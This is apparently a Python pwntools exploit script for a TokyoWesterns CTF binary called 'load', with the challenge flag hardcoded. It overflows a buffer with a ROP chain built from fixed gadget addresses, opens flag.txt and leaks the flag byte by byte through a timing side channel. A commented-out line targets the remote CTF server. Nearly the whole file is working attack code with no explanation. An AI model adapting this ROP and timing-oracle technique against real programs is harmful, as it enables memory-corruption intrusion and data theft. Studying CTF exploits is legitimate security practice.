from pwn import *
from string import printable
import sys
import time
import os


context.log_level = "error"
context.arch = "amd64"



idx = 0
flag = ""
idx = len(flag)

while True:
	done = True
	for p in "TWCTF{pr0cf5_15_h1ghly_fl3x1bl3}"[idx:]:
#		r = process(["./load"])
		r = process("socat - system:./load,pty,raw,echo=0".split())
		#r = remote("pwn1.chal.ctf.westerns.tokyo",34835)
		r.sendlineafter(":","/dev/stdin".ljust(0x10,"\x00")+"flag.txt\x00".ljust(0x30,'\x00')+p64(0xfe))
		r.sendlineafter(":","0")
		r.sendlineafter(":",str(0x1000))
		payload = "a"*0x38+flat(
		0x400a6a,0x0,0x1,0x600ff0,0x0,0x0,0x601050,0x400a50,0x0,
		0x0,0x1,0x600fb8,0x0,idx,0x0,0x400a50,0x0,
		0x0,0x1,0x600fc8,0x1,0x6010a0,0x0,0x400a50,0x0,
		0x0,0x1,0x600fb0,0x0,ord(p),0x6010a0,0x400a50,0x0,
		0x0,0x1,0x600fb0,0x0,0xff,0x400775,0x40076a,0x1,0x400a50,0x0,
		0x0,0x1,0x600fb0,0x0,0xff,0x400775,0x400775
		)
#		input(":")
		r.sendline(payload)
#		r.interactive()
#		continue
		d = time.time()
		r.recvall(timeout=2)
		d = time.time()-d
#		sys.stdout.flush()
		os.system('clear')
		print "\r%d ->  %s %s"%(d,p,flag)
		sys.stdout.flush()
		if d<2:
			flag+=p
			idx+=1
			done = False
			break
	if done:
		break


print flag


